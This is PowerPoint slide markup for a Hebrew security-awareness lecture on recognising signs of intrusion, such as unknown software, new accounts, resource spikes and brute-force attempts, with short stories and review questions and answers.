      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1207778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D1C3340-68BF-43F4-80F8-3830DCCEF5AD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1649896" y="642594"/>
            <a:ext cx="9475304" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. הודעות מערכת שגויות או לא צפויות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{457B13B7-7304-4CE8-9928-9FAA7F324C6A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הודעות על טעויות או על כשלי מערכת שאינן מוכרות למשתמש יכולות להעיד על נוכחות תוכנה זדונית או על ניסיון חדירה למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עובד במפעל קיבל הודעה חריגה על כשל במערכת האבטחה של המחשב שלו. ההודעה נראתה שונה מהודעות השגיאה הרגילות של מערכת ההפעלה. לאחר חקירה, התגלה שמדובר בתוכנה זדונית שניסתה להטעות את המשתמש ולבצע מתקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> על המערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="153255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46C3E97-A90F-4E50-B191-9335070C3595}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1162878" y="642594"/>
            <a:ext cx="9962322" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. התקנת תוכנות לא מוכרות או לא מאושרות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8E0D711B-F8E6-44E6-A6DB-040F1E7F7150}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם במערכת מופיעות תוכנות חדשות שלא הותקנו על ידי המשתמשים או המנהלים, זו תופעה מאוד חשודה. זה עשוי להצביע על כך שהתוקפים הצליחו לחדור למערכת והתקינו תוכנה זדונית כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Spyware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עובד במשרד ממשלתי גילה תוכנה חדשה שלא זיהה על המחשב שלו. לאחר בדיקה, התגלה שהתוכנה הזו שימשה לתיעוד כל הקשות המקלדת שלו ולשליחת המידע לתוקפים. זה גרם להדבקת כל הרשת במתקפה חמורה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1747658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6A6D216-E8C5-4AFC-A10F-B9DB8A4BAF4A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1292086" y="642594"/>
            <a:ext cx="9833113" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>7. חשבונות משתמש חדשים ולא מוכרים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FC26EC94-418F-45F6-AB5B-D4491CCEAD65}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת חשבונות משתמש חדשים ללא ידיעה של המנהלים יכולה להעיד על חדירה למערכת. תוקפים עשויים ליצור חשבונות חדשים כדי לשמור על גישה קבועה למערכת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בבית חולים גדול, התגלה חשבון משתמש חדש עם הרשאות גישה גבוהות. אף אחד מהמנהלים לא ידע על קיומו של חשבון זה. לאחר חקירה, התגלה שהתוקפים יצרו את החשבון כדי לגשת לרשומות רפואיות רגישות ולגנוב אותן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1972901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79B24F5-CDA5-49A0-8741-FD145E14007F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2315817" y="642594"/>
            <a:ext cx="8809382" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{98922501-A525-463B-A1B9-839A0FC4EB19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ישנם עוד אפשרויות שעל ידם ניתן לזהות שמשהו חדר למערכת שלנו:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנומליות בגישת קבצים: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אנומליות בגישת קבצים כוללות כל גישה לא שגרתית לקבצים קריטיים או לקבצים שמכילים מידע רגיש. לדוגמה, אם משתמש פתאום מתחיל לגשת לקבצים רבים בצורה שיטתית, או משנה קבצים שהוא לא אמור לגשת אליהם – זה יכול להיות סימן לכך שחשבון המשתמש נפרץ, או שהמשתמש עוסק בפעילות זדונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שינויים לא מוסברים בהגדרות המערכת: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שינויים בלתי מוסברים בהגדרות מערכת יכולים להוות אינדיקציה לכך שהמערכת נמצאת תחת התקפה. זה כולל שינויים בהגדרות האבטחה, פתיחת יציאות חדשות (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ports), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או התקנת תוכנות לא מוכרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול גבוה של משאבי מערכת: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם מערכת פתאום מתחילה להשתמש במשאבים רבים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זיכרון, או תעבורה ברשת ללא סיבה ברורה, זה עשוי להצביע על פעילות זדונית כמו תוכנות כופר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>בוטנט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Botnet</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מכשירים לא מוכרים המחוברים לרשת: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זיהוי מכשירים לא מוכרים ברשת יכול להעיד על ניסיון חדירה לרשת הארגונית. תוקפים יכולים לחבר מכשירים זדוניים לרשת כדי לאסוף מידע או לבצע מתקפות.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1127239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8D2FF46-208B-4ECD-907A-CF726CD8F8E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1451112" y="632655"/>
            <a:ext cx="9813235" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2441C18B-3C7B-41F6-A3B2-4BC3D9C8462B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>התנהגות חריגה של משתמשים: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אם משתמשים מתחילים לבצע פעולות שלא תואמות את דפוסי העבודה הרגילים שלהם, זה עלול להצביע על חשש לפעילות זדונית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>6. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניסיונות חיבור מרובים ובלתי מוצלחים: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניסיונות חוזרים ונשנים להתחבר למערכת או לחשבונות משתמש, במיוחד עם סיסמאות שגויות, עשויים להצביע על מתקפה של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Brute Force</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שבה תוקף מנסה לנחש את הסיסמה באמצעות מספר רב של ניסיונות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1391096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DB1F04F-1479-4155-8DA8-CC2BF562493F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1361660" y="642594"/>
            <a:ext cx="9763539" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{201F7337-C987-4502-8CB3-52EFEE3CDE1C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2381416"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וכבר ראינו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" u="sng" dirty="0"/>
              <a:t>בהרצאה מספר 4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את הנושא של אבטחה על הרשת המספקת לנו את האמצעיים הנדרשים בכדי להגן במידה ואנו רואים תופעה חשודה אצלנו במערכת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="729470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DE6309-B5E3-4BEA-B208-2B3AF0C7A549}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1182756" y="642594"/>
            <a:ext cx="9942443" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{24CCD7A5-FDA9-410F-BAFB-1AAC0B04EB5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מהי תופעה חשודה וכיצד ניתן לזהות אותה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד ניתן להבדיל בין תקלה טכנית לבין תופעה חשודה באבטחת מידע?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהם הצעדים הראשונים שיש לנקוט כאשר מזוהה תופעה חשודה?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מדוע חשובה היכולת לזהות תעבורה לא שגרתית ברשת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. איך ניתן להתמודד עם ניסיונות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שנשלחים במיילים חשודים?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="487551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0195F72-49D4-4B44-A16A-F45F047A4493}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2017642" y="642594"/>
            <a:ext cx="9107557" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52E58896-198F-43D2-8715-2AD35CE31FB8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. תופעה חשודה היא אינדיקציה לכך שמערכת או רשת עשויות להיות תחת סיכון או התקפה. ניתן לזהות תופעות חשודות על ידי ניטור התנהגות לא רגילה, כמו ניסיונות התחברות מרובים וכושלים, תעבורה לא שגרתית ברשת, שינויים לא מוסברים בקבצים חיוניים, התקנת תוכנות לא מוכרות, או יצירת חשבונות משתמש חדשים ללא אישור.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. תקלות טכניות הן לרוב תוצאה של שגיאות מערכת או תקלות בתוכנה, והן אינן כוללות דפוס התנהגות מתמשך או מכוון. לעומת זאת, תופעה חשודה באבטחת מידע כוללת סימנים לכך שמישהו מנסה לגשת למערכת בצורה לא חוקית או לגרום לנזק. למשל, ניסיונות התחברות רבים עם סיסמאות שגויות או שינויים בקבצים חשובים הם דפוסי פעולה שמרמזים על פעילות זדונית.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2206943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1143A29-609B-4B63-A681-44C6D1B2B7E2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1152939" y="731520"/>
            <a:ext cx="10684565" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך תשובות - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F2D7844F-A59B-4D2B-B146-E5F8F1EBB34D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כאשר מזוהה תופעה חשודה, הצעדים הראשונים שיש לנקוט כוללים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>א. ניתוק המערכת החשודה מהרשת כדי למנוע נזק נוסף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ב. זיהוי המקור של התופעה החשודה (כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> קובץ חשוד, וכו').</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ג. ביצוע בדיקות נוספות לאימות החשדות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ד. דיווח לצוות האבטחה של הארגון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ה. התחלת תהליך חקירה ואיסוף ראיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="760928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4A57F0-34BB-4326-9161-2307F4DA3AD1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066799" y="642594"/>
            <a:ext cx="10691191" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך תשובות - תופעות חשודות באבטחת מידע</a:t>
            </a:r>
          </a:p>
